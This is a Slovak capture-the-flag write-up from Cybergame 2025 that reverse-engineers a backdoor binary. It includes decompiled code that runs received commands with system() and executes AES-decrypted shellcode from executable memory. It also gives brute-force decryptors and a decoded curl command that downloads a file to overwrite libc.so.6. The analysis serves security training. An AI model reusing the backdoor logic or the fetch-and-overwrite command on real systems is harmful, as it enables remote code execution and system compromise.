# Zadanie

EN: Analyst Log – 12:47 PM: The blob showed up after SystemUpdate did its thing. Just a data. No extension. No metadata. No readme. No hope. The problem? There. Is. No. Key. I’ve tried dictionary attacks, rainbow tables, entropy analysis, even feeding it to a very confused intern. Nothing… At one point, I shouted my Wi-Fi password at the screen out of raw frustration. Didn’t help, but I felt better for two seconds. I thought I saw a familiar pattern in the entropy graph. Turns out it was just a coffee stain on my monitor. This isn’t just encryption. This is a test of character. And Greg? Greg is not winning.

SK: Záznam analytika – 12:47 : Blob sa objavil po tom, čo si SystemUpdate „odrobil svoje“. Len dáta. Bez prípony. Bez metadát. Bez readme. Bez nádeje. Problém? Nie je. Žiadny. Kľúč. Skúšal som dictionary útoky, rainbow tabulky, analýzu entropie, dokonca som to podsunul zmätenému stážistovi. Nič… V jednom momente som zo zúfalstva začal kričať svoje Wi-Fi heslo na obrazovku. Nepomohlo. Ale na dve sekundy som sa cítil lepšie. Myslel som si, že som v grafe entropie spoznal známy vzor. Ukázalo sa, že je to len fľak od kávy na monitore. Toto nie je len šifrovanie. Toto je test osobnosti. A Greg? Greg prehráva.

## Riešenie

Z predošlej úlohy viem, že potrebujem odoslať payload na `195.168.112.4` na port `7052` s obsahom `SK-CERT{g3771ng_p4yl04d}`

Urobím tak pomocou príkazu

```bash
echo -n 'SK-CERT{g3771ng_p4yl04d}' | nc 195.168.112.4 7052 > blob_raw.bin
```

Z predošlej úlohy, z funckie

```c
void FUN_00101f50(void)

{
  char *__buf;
  int __fd;
  int iVar1;
  long lVar2;
  size_t __n;
  ssize_t sVar3;
  sockaddr local_28;

  __fd = socket(2,1,0);
  if (-1 < __fd) {
    local_28.sa_family = 2;
    local_28.sa_data[0] = 0x1b;
    local_28.sa_data[1] = 0x8c;
    iVar1 = inet_pton(2,"195.168.112.4",local_28.sa_data + 2);
    if ((0 < iVar1) && (iVar1 = connect(__fd,&local_28,16), __buf = DAT_00105260, -1 < iVar1)) {
      lVar2 = 0;
      do {
        if ((&DAT_00105220)[lVar2] != (&DAT_001050f0)[lVar2]) {
          return;
        }
        lVar2 = lVar2 + 1;
      } while (lVar2 != 24);
      __n = strlen(DAT_00105260);
      sVar3 = send(__fd,__buf,__n,0);
      if (-1 < sVar3) {
        FUN_00101e70();
        close(__fd);
        return;
      }
    }
    close(__fd);
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

viem, že sa bude volať `FUN_00101e70`

```c
void FUN_00101e70(int param_1)

{
  int iVar1;
  ssize_t sVar2;
  char *pcVar3;
  size_t sVar4;
  long lVar5;
  char acStack_428 [5];
  char local_423 [1027];

  pcVar3 = acStack_428;
  for (lVar5 = 128; lVar5 != 0; lVar5 = lVar5 + -1) {
    *(undefined8 *)pcVar3 = 0;
    pcVar3 = (char *)((long)pcVar3 + 8);
  }
  sVar2 = read(param_1,acStack_428,1023);
  iVar1 = (int)sVar2;
  if (-1 < iVar1) {
    acStack_428[iVar1] = '\0';
    pcVar3 = strstr(acStack_428,"COMMAND: ");
    if (pcVar3 != (char *)0x0) {
      do {
        sVar4 = strlen(pcVar3 + 9);
        memmove(pcVar3,pcVar3 + 9,sVar4 + 1);
        pcVar3 = strstr(acStack_428,"COMMAND: ");
      } while (pcVar3 != (char *)0x0);
      system(acStack_428);
      return;
    }
    FUN_00101d20(acStack_428 + 5,iVar1 + -5);
    return;
  }
  close(param_1);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Táto však očakáva na začiatku blobu `COMMAN: ` a ak ho nenájde, tak stripne prvých 5 bajtov a zavolá `FUN_00101d20`.

```c
undefined8 FUN_00101d20(uchar *param_1,int param_2)

{
  uint __seed;
  int iVar1;
  int iVar2;
  EVP_CIPHER_CTX *ctx;
  EVP_CIPHER *cipher;
  void *__dest;
  code *pcVar3;
  long lVar4;
  int local_105c;
  uchar local_1058 [16];
  uchar local_1048 [16];
  uchar local_1038 [4104];

  lVar4 = 0;
  __seed = FUN_00101c30("/lib/x86_64-linux-gnu/libc.so.6");
  srand(__seed);
  do {
    iVar1 = rand();
    local_1058[lVar4] = (uchar)iVar1;
    iVar1 = rand();
    local_1048[lVar4] = (uchar)iVar1;
    lVar4 = lVar4 + 1;
  } while (lVar4 != 0x10);
  ctx = EVP_CIPHER_CTX_new();
  cipher = EVP_aes_128_cbc();
  EVP_DecryptInit_ex(ctx,cipher,(ENGINE *)0x0,local_1058,local_1048);
  EVP_DecryptUpdate(ctx,local_1038,&local_105c,param_1,param_2);
  iVar1 = local_105c;
  iVar2 = EVP_DecryptFinal_ex(ctx,local_1038 + local_105c,&local_105c);
  if (iVar2 < 1) {
    EVP_CIPHER_CTX_free(ctx);
  }
  else {
    iVar1 = iVar1 + local_105c;
    EVP_CIPHER_CTX_free(ctx);
    if (-1 < iVar1) {
      local_1038[iVar1] = '\0';
      __dest = mmap((void *)0x0,(long)param_2,7,0x22,-1,0);
      if (__dest != (void *)0xffffffffffffffff) {
        pcVar3 = (code *)memcpy(__dest,local_1038,(long)iVar1);
        (*pcVar3)();
        return 0;
      }
      perror("mmap");
    }
  }
  return 1;
}


///////////////////////////////////////////


ulong FUN_00101c30(char *param_1)

{
  uint uVar1;
  FILE *__stream;
  char *pcVar2;
  ulong uVar3;
  uint local_120;
  uint local_11c;
  char local_118 [256];

  local_120 = 0;
  local_11c = 0;
  __stream = popen(param_1,"r");
  if (__stream != (FILE *)0x0) {
    do {
      pcVar2 = fgets(local_118,0x100,__stream);
      if (pcVar2 == (char *)0x0) goto LAB_00101c9d;
      pcVar2 = strstr(local_118,"release version");
    } while (pcVar2 == (char *)0x0);
    __isoc99_sscanf(local_118,"%*[^0-9]%u.%u",&local_120,&local_11c);
LAB_00101c9d:
    pclose(__stream);
    if (local_120 != 0 || local_11c != 0) {
      uVar1 = local_120 << 0x10 | local_11c << 8 | local_120 ^ local_11c;
      uVar1 = (uVar1 ^ uVar1 >> 0xd) * 0x5bd1e995;
      return (ulong)(uVar1 ^ uVar1 >> 0xf);
    }
  }
  uVar3 = time((time_t *)0x0);
  return uVar3;
}
```

Táto sa snaží blob dešifrovať, pričom kľúč sa generuje pomocou rand funckie, kde seed je buď verzia libc.so.6 shared objektu alebo ak nenájde verziu, tak pomocou epoch unix timestampu.. Výstup sa mi zo servera vracia stále taký istý, takže časová pečiatka to nebude. Treba zistiť verziu, ale tú nevie, no tých verzií zas toľko nie je. Verzie nájdeme napr. tu [The GNU C Library Release Timeline](https://sourceware.org/glibc/wiki/Glibc%20Timeline)

Vezmem verzie za posledných 5 rokov, zas tak veľa ich nie a brutnem to.

Skompilujem si tento c kód na dešifrovanie pomocou `gcc decrypt_bruteforce.c -o decrypt_bruteforce -lcrypto -lssl` a spustím.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <time.h>

unsigned int generate_seed(unsigned int major, unsigned int minor) {
    unsigned int val = (major << 16) | (minor << 8) | (major ^ minor);
    val = (val ^ val >> 13) * 0x5bd1e995;
    return val ^ val >> 15;
}

int decrypt_and_save(const char* input_filename, const char* output_filename, unsigned int seed) {
    FILE* file = fopen(input_filename, "rb");
    if (!file) {
        perror("fopen input");
        return -1;
    }

    fseek(file, 0, SEEK_END);
    long input_len = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* input_data = malloc(input_len);
    fread(input_data, 1, input_len, file);
    fclose(file);

    unsigned char key[16], iv[16];
    srand(seed);
    for (int i = 0; i < 16; i++) {
        key[i] = rand() & 0xFF;
        iv[i] = rand() & 0xFF;
    }

    unsigned char* plaintext = malloc(input_len + AES_BLOCK_SIZE);
    int len, plaintext_len;

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);

    EVP_DecryptUpdate(ctx, plaintext, &len, input_data, input_len);
    plaintext_len = len;

    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) > 0) {
        plaintext_len += len;
        FILE* out_file = fopen(output_filename, "wb");
        if (!out_file) {
            perror("fopen output");
            EVP_CIPHER_CTX_free(ctx);
            free(input_data);
            free(plaintext);
            return -1;
        }
        fwrite(plaintext, 1, plaintext_len, out_file);
        fclose(out_file);
        printf("Decrypted successfully: %s\n", output_filename);
    } else {
        printf("Decryption failed: %s\n", output_filename);
    }

    EVP_CIPHER_CTX_free(ctx);
    free(input_data);
    free(plaintext);
    return 0;
}

int main() {
    const char* input_file = "blob.bin";
    char output_file[256];

    for (unsigned int major = 2; major <= 2; major++) {
        for (unsigned int minor = 31; minor <= 41; minor++) {
            unsigned int seed = generate_seed(major, minor);
            snprintf(output_file, sizeof(output_file), "%u.%u_deciphered.bin", major, minor);
            decrypt_and_save(input_file, output_file, seed);
        }
    }

    return 0;
}
```

Alebo python ekvivalent s použitím volania C funkcií

```python
import ctypes
from Crypto.Cipher import AES

libc = ctypes.CDLL("libc.so.6")
srand = libc.srand
srand.argtypes = [ctypes.c_uint]
rand = libc.rand
rand.restype = ctypes.c_int

def generate_seed(major: int, minor: int) -> int:
    val = (major << 16) | (minor << 8) | (major ^ minor)
    val = ((val ^ (val >> 13)) * 0x5BD1E995) & 0xFFFFFFFF
    return (val ^ (val >> 15)) & 0xFFFFFFFF


def derive_key_iv(seed: int):
    srand(seed)
    key = bytearray(16)
    iv  = bytearray(16)
    for i in range(16):
        key[i] = rand() & 0xFF
        iv[i]  = rand() & 0xFF
    return bytes(key), bytes(iv)


def valid_pkcs7(data: bytes) -> bool:
    if not data:
        return False
    pad_len = data[-1]
    if pad_len < 1 or pad_len > AES.block_size:
        return False
    if data[-pad_len:] != bytes([pad_len]) * pad_len:
        return False
    return True


def decrypt_blob(ciphertext: bytes, key: bytes, iv: bytes):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    if not valid_pkcs7(plaintext):
        return None
    return plaintext[:-plaintext[-1]]

def brute_minor_range(input_filename: str, major: int, minor_from: int, minor_to: int):
    with open(input_filename, "rb") as f:
        blob = f.read()

    for minor in range(minor_from, minor_to + 1):
        seed = generate_seed(major, minor)
        key, iv = derive_key_iv(seed)


        plaintext = decrypt_blob(blob, key, iv)
        if plaintext is None:
            print(f"Decryption failed: {major}.{minor}_deciphered.bin")
            continue

        out_name = f"{major}.{minor}_deciphered.bin"
        with open(out_name, "wb") as out:
            out.write(plaintext)
        print(f"Decrypted successfully : {out_name}")



if __name__ == "__main__":
    brute_minor_range("blob.bin", major=2, minor_from=31, minor_to=41)

```

Výstup

```c
majino@majino:/mnt/e/CTFs/Cybergame2025/Greg$ ./decrypt_bruteforce
Decryption failed: 2.31_deciphered.bin
Decryption failed: 2.32_deciphered.bin
Decryption failed: 2.33_deciphered.bin
Decryption failed: 2.34_deciphered.bin
Decryption failed: 2.35_deciphered.bin
Decryption failed: 2.36_deciphered.bin
Decryption failed: 2.37_deciphered.bin
Decrypted successfully: 2.38_deciphered.bin
Decryption failed: 2.39_deciphered.bin
Decryption failed: 2.40_deciphered.bin
Decryption failed: 2.41_deciphered.bin
```

Dostali sme shellcode pomocou seedu verzie 2.38 a takto vyzerá jeho pseudokód vygenerovaný pomocou ChatGPT

```c
#include <stdint.h>
#include <stddef.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

// Zašifrované dáta
unsigned char data[] = {
    0xF0, 0xCE, 0xCB, 0xC9, 0xBD, 0xF5, 0xC1, 0xC1, 0xCD, 0x83, 0x8C, 0x8C, 0xFF, 0xF2, 0xC9, 0xFE,
    0xC0, 0xB7, 0xF0, 0xC2, 0xFB, 0xFE, 0xCB, 0xF4, 0xFA, 0xF6, 0xFE, 0xB7, 0xC0, 0xC8, 0x8C, 0xC0,
    0xC2, 0xC0, 0xC1, 0xFE, 0xF6, 0xCE, 0xCD, 0xF1, 0xFA, 0xC1, 0xFE, 0xB6, 0x8B, 0xFB, 0x8A, 0x84,
    0x81, 0xF1, 0x85, 0x82, 0xB6, 0x8E, 0x8F, 0x81, 0xFB, 0xB6, 0x81, 0x8D, 0x8B, 0x81, 0xB6, 0xFA,
    0xF0, 0xFB, 0x8F, 0xB6, 0xFB, 0x8A, 0x82, 0x8E, 0xFF, 0x81, 0xF0, 0x85, 0x8A, 0xFA, 0x80, 0xF0,
    0x8C, 0xC9, 0xF2, 0xFB, 0xB7, 0xC0, 0xCC, 0xB0, 0xA0, 0xA8, 0xB6, 0xD0, 0xDE, 0xAB, 0xA1, 0x18,
    0xFB, 0x8A, 0xF7, 0xFC, 0xCD, 0x81, 0xC2, 0xC9, 0x8D, 0x81, 0xF1, 0xFC, 0xF1, 0x8D, 0x80, 0x8E,
    0xFC, 0xF7, 0x8D, 0x84, 0xFC, 0xC0, 0x80, 0x80, 0xF6, 0x8E, 0xFC, 0xC9, 0x8A, 0xC8, 0x80, 0xFC,
    0xF0, 0x8D, 0xF6, 0xF6, 0x81, 0xF7, 0xF1, 0x8E, 0x06, 0xBD, 0xC7, 0xBD, 0x8C, 0xC9, 0xF2, 0xFB,
    0xFC, 0xC0, 0xFA, 0xFF, 0xFE, 0x8C, 0xC5, 0x85, 0x8F, 0xFC, 0x8F, 0x81, 0xB6, 0xC9, 0xF2, 0xF7,
    0xCE, 0xC5, 0xB6, 0xF4, 0xF7, 0xCE, 0x8C, 0xC9, 0xF2, 0xFB, 0xF0, 0xB7, 0xC0, 0xCC, 0xB7, 0x8F,
    0xBD
};

void shellcode(void) {
    // 1) Nastavíme pointer na zašifrované dáta
    uint8_t *enc = data;
    size_t len = sizeof(data) / sizeof(data[0]);  // 0xB1 = 177

    // 2) Dekódovanie šifrovaných dát
    for (size_t i = 0; i < len; i++) {
        uint8_t c = enc[i];
        c ^= 0x68;   // xor 0x68
        c += 0x32;   // add 0x32
        c ^= 0xE2;   // xor 0xE2
        c -= 0xC5;   // sub 0xC5
        enc[i] = c;
    }
    // Pridáme nulový terminátor za dekódované dáta
    // (v pôvodnom shellcode sa na to využíval jeden bajt 0x00)
    // Pozor: data musí mať miesto +1 pre '\0' alebo použiť externé bufferovanie.

    // 3) Zápis dekódovaného skriptu do súboru /tmp/s
    const char *path = "/tmp/s";
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) exit(1);
    write(fd, enc, len);
    close(fd);

    // 4) Nastavenie práv na spustenie
    chmod(path, 0777);

    // 5) Príprava argumentov pre execve
    char *argv_exec[] = {
        "/bin/sh",
        "-c",
        (char *)path,
        NULL
    };

    // 6) Spustenie skriptu
    execve("/bin/sh", argv_exec, NULL);

    // 7) Ak execve zlyhá, ukončíme proces
    exit(0);
}
```

Vieme čo robí, ale čo sa spustí zistím python skriptom

```python
data = bytearray([
    0xF0, 0xCE, 0xCB, 0xC9, 0xBD, 0xF5, 0xC1, 0xC1, 0xCD, 0x83, 0x8C, 0x8C, 0xFF, 0xF2, 0xC9, 0xFE,
    0xC0, 0xB7, 0xF0, 0xC2, 0xFB, 0xFE, 0xCB, 0xF4, 0xFA, 0xF6, 0xFE, 0xB7, 0xC0, 0xC8, 0x8C, 0xC0,
    0xC2, 0xC0, 0xC1, 0xFE, 0xF6, 0xCE, 0xCD, 0xF1, 0xFA, 0xC1, 0xFE, 0xB6, 0x8B, 0xFB, 0x8A, 0x84,
    0x81, 0xF1, 0x85, 0x82, 0xB6, 0x8E, 0x8F, 0x81, 0xFB, 0xB6, 0x81, 0x8D, 0x8B, 0x81, 0xB6, 0xFA,
    0xF0, 0xFB, 0x8F, 0xB6, 0xFB, 0x8A, 0x82, 0x8E, 0xFF, 0x81, 0xF0, 0x85, 0x8A, 0xFA, 0x80, 0xF0,
    0x8C, 0xC9, 0xF2, 0xFB, 0xB7, 0xC0, 0xCC, 0xB0, 0xA0, 0xA8, 0xB6, 0xD0, 0xDE, 0xAB, 0xA1, 0x18,
    0xFB, 0x8A, 0xF7, 0xFC, 0xCD, 0x81, 0xC2, 0xC9, 0x8D, 0x81, 0xF1, 0xFC, 0xF1, 0x8D, 0x80, 0x8E,
    0xFC, 0xF7, 0x8D, 0x84, 0xFC, 0xC0, 0x80, 0x80, 0xF6, 0x8E, 0xFC, 0xC9, 0x8A, 0xC8, 0x80, 0xFC,
    0xF0, 0x8D, 0xF6, 0xF6, 0x81, 0xF7, 0xF1, 0x8E, 0x06, 0xBD, 0xC7, 0xBD, 0x8C, 0xC9, 0xF2, 0xFB,
    0xFC, 0xC0, 0xFA, 0xFF, 0xFE, 0x8C, 0xC5, 0x85, 0x8F, 0xFC, 0x8F, 0x81, 0xB6, 0xC9, 0xF2, 0xF7,
    0xCE, 0xC5, 0xB6, 0xF4, 0xF7, 0xCE, 0x8C, 0xC9, 0xF2, 0xFB, 0xF0, 0xB7, 0xC0, 0xCC, 0xB7, 0x8F,
    0xBD
])

for i in range(0xB1):
    data[i] ^= 0x68
    data[i] = (data[i] + 0x32) & 0xFF
    data[i] ^= 0xE2
    data[i] = (data[i] - 0xC5) & 0xFF
data.append(0)

decoded_string = data.decode('utf-8', errors='ignore')
print(decoded_string)
```

Výstup

`curl http://files.cybergame.sk/systemupdate-2b174d89-564b-4024-acb6-b195f4c81a3c/lib.so#SK-CERT{b1n_p4yl04d_d035_n07_s33m5_l1k3_c0mm4nd5} > /lib_safe/x86_64-linux-gnu/libc.so.6`

## Vlajka

```
SK-CERT{b1n_p4yl04d_d035_n07_s33m5_l1k3_c0mm4nd5}
```
